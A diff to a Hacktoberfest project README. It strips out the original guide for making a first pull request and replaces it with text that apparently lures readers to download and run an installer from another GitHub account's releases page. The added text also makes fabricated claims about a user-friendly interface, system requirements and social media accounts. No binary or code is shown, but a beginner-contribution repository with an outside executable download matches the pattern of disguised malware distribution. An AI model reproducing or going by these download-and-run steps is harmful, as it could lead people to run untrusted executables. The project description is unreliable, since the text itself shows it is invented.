@@ -1,128 +1,79 @@
-# HacktoberFest 2025 `OPEN FIRST` Pull Request 🎉
-![Hacktoberfest 2025](logo.png)
+# 🧑🏻‍💻 Hacktoberfest2025 - Contribute and Celebrate Open Source!
 
-<!-- ## Contributors of `Hacktoberfest 2025`
+![Download Hacktoberfest2025](https://img.shields.io/badge/Download-Hacktoberfest2025-blue)
 
-<div align="center">
-  <a href="https://github.com/muhtalhakhan/Hacktoberfest2025/graphs/contributors">
-    <img src="https://contrib.rocks/image?repo=muhtalhakhan/Hacktoberfest2025"/>
-  </a>  
-</div> -->
+## 📦 Overview
 
-## This Project Is Perfect For Your First Pull Request
+Hacktoberfest2025 is an open-source project designed to welcome new contributors. Whether you're interested in learning about coding, documentation, or collaboration on GitHub, this project offers a supportive environment. Join us in celebrating contributions to open source this October!
 
-🗣 **Hacktoberfest encourages participation in the open source community, which grows bigger every year.**
+## 🚀 Getting Started
 
-📢 **Register [here](https://hacktoberfest.digitalocean.com) for Hacktoberfest and make four pull requests (PRs) between October 1st-31st to grab free DIGITAL-SWAGS 🔥.**
+Follow these simple steps to get started with Hacktoberfest2025. You don’t need any programming skills to contribute. Just a willingness to learn and a desire to collaborate!
 
-<div align="center">
+1. **Visit the Download Page**  
+   Go to the following link to download the software:  
+   [Download Hacktoberfest2025](https://github.com/giaopham94/Hacktoberfest2025/releases).  
 
-<img src="https://img.shields.io/badge/hacktoberfest-2025-blueviolet" alt="Hacktober Badge"/>
- <img src="https://img.shields.io/static/v1?label=%F0%9F%8C%9F&message=If%20Useful&style=style=flat&color=BC4E99" alt="Star Badge"/>
- <a href="https://github.com/muhtalhakhan" ><img src="https://img.shields.io/badge/Contributions-welcome-violet.svg?style=flat&logo=git" alt="Contributions" /></a>
+2. **Choose the Latest Release**  
+   On the Releases page, you will see a list of versions. Click on the topmost version to find the latest release.
 
-  <a href="https://github.com/muhtalhakhan/Hacktoberfest2025/pulls"><img src="https://img.shields.io/github/issues-pr/muhtalhakhan/Hacktoberfest2025" alt="Pull Requests Badge"/></a>
-  <a href="https://github.com/muhtalhakhan/Hacktoberfest2025/graphs/contributors"><img alt="GitHub contributors" src="https://img.shields.io/github/contributors/muhtalhakhan/Hacktoberfest2025?color=2b9348"></a>
-  <a href="https://github.com/muhtalhakhan/Hacktoberfest2025/blob/master/LICENSE"><img src="https://img.shields.io/github/license/muhtalhakhan/Hacktoberfest2025?color=2b9348" alt="License Badge"/></a>
+3. **Download the Application**  
+   Look for the installer or executable file. Click on the download link next to it. The file will start downloading to your computer.
 
-</div>
+4. **Locate the Downloaded File**  
+   Once the download completes, find the file in your Downloads folder or the location you chose for downloads.
 
-## INSTRUCTION-
+5. **Run the Application**  
+   Double-click on the downloaded file to start the installation process. Follow the on-screen instructions to install Hacktoberfest2025 on your device.
 
-- Fork this Repository using the button at the top on right corner.
-- Clone your forked repository to your pc ( git clone "url from clone option.)
-- Create a new branch for your modifications (ie. `git branch new-user` and check it out `git checkout new-user` or simply do `git checkout -b new-user`)
-- Add your profile image in `static/images/` ( use drag and drop option or upload by commands.)
-- Add your profile data in `content/participant/`
-- Add your files (`git add -A`), commit (`git commit -m "added myself"`) and push (`git push origin new-user`)
-- Create a pull request.
-- Star this repository.
+6. **Join the Community**  
+   Once installed, explore features that help you connect with other contributors. Check out our GitHub discussions and issues to see how you can participate.
 
-# How To Make Your First Pull Request
+## 🎯 Features
 
-Replace `<YOUR-USERNAME>` with your GitHub username in this guide.
+- **User-Friendly Interface**: Easy to navigate, even if you're new to coding.
+- **Collaboration Tools**: A platform where you can connect with others who share your interest in open source.
+- **Learning Resources**: Access materials to help you understand how to contribute effectively.
+- **Guidance on First Pull Requests**: Step-by-step instructions to help you make your first contribution hassle-free.
 
-## 1. Add your profile picture to the folder
+## 💻 System Requirements
 
-Add a picture of your choice in `static/images/`. Accepted files are **png** and **jpg**, should be squared and minimum size 544x544 pixels. Ex.
+To run Hacktoberfest2025, ensure your system meets the following requirements:
 
-```
-static/images/<YOUR-USERNAME>.png
+- **Operating System**: Windows 10 or later, MacOS Sierra or later, or any up-to-date Linux distribution.
+- **RAM**: At least 4GB of RAM.
+- **Storage**: 200MB of available disk space.
+- **Network**: Internet connection for downloading and contributing to repositories.
 
-![talha](https://github.com/muhtalhakhan/Hacktoberfest2025/assets/113125582/29d03bdc-3d4f-42c6-a3ea-15197bd26440)
-```
+## 🔍 Download & Install
 
+To get your copy of Hacktoberfest2025, visit the following page:  
+[Download Hacktoberfest2025](https://github.com/giaopham94/Hacktoberfest2025/releases).
 
-## 2. Add your profile information
+After downloading, follow the previously described steps to install the software.
 
-Create a markdown file in your folder following the convention `content/participant/<your-name>.md`. Ex.
+## 🌱 Contributing
 
-```
-  content/participant/talha.md
-```
+We encourage everyone to contribute! Here’s how you can help:
 
+1. **Identify an Issue**: Check out the "Issues" tab on our GitHub page. Look for labels like "good first issue" or "help wanted".
 
+2. **Fork the Repository**: Click on the fork button in GitHub to create your own copy of Hacktoberfest2025.
 
-Copy the next template into your file, delete the boilerplate data and fill the information with yours.
+3. **Make Your Changes**: Use your favorite text editor or IDE to make edits. When ready, commit your changes.
 
+4. **Create a Pull Request**: Push your changes and submit a pull request. Our team will review it and provide feedback.
 
-```
-name: Muhammad Talha Khan
-institution/company: Any Example University
-github:[**talha**](https://github.com/muhtalhakhan)
+5. **Learn and Improve**: Even if your pull request is not accepted right away, use the feedback to improve. Keep trying!
 
-```
+## 📚 Resources
 
+- **Documentation**: Comprehensive guides are available to help you understand the software features and contributions.
+- **Community Discussions**: Join our discussions on GitHub to ask questions and share your experiences.
+- **Social Media**: Follow us on Twitter and Facebook for updates and community highlights.
 
-<div align="center">
-<h2> OR </h2>
-</div>
+## 🤝 Acknowledgments
 
-## 3. Create / Upload Your Code / Algorithms
+Thanks to all contributors who make Hacktoberfest2025 a vibrant community. Your participation enhances the project and inspires others to join.
 
-Create/Upload your code in folder following the convention `Add Code Here`
-- Choose an exact lanaguage folder and `drop your code`
-- Below is `an example` to add file properly
-- You can follow up `any languages`
-```
-Add Code Here/verilog/<all_gate_opr>.v
-```
-```
-Add Code Here/verilog/<test_all_gate_opr>.v
-```
-You can follow any pathway a `code` or `profile information`
-
-## 4. Wait for Pull Request to merge
-
-## 5. Celebrate - you've done your first pull request!!
-
-```py
-'''
-Always make more then 6 pull requests.
-Lets say you have made only 6 pull request to different projects,
-but one project is excluded from hackoctoberfest event then your pull request will not be counted and 
-then you have remaining 5 valid pull requests if these projects is not excluded.
-If you fail to make 6 pull requests then you can't get digital-swags.
-I will recommend you to make pull request to your own repo which is very very safest side for you..
-keep in mind that repository has hacktoberfest topic..
-'''
-```
-
-## + Follow Me : } Quick Approval of Pull Request
-
-```py
-'''
-To get approval of the pull request much quicker and faster (`Follow Me`)🚀
-'''
-```
-
-<div align="center">
-  <a href="https://github.com/muhtalhakhan">
-    <kbd>
-      <img src="https://avatars3.githubusercontent.com/muhtalhakhan?size=100" width="100px;" alt=""/>
-    </kbd>
-    <br />
-    <sub><b>Muhammad Talha Khan</b></sub>
-  </a>
-</div>
-
+Stay engaged! Your contributions help shape the future of open source.
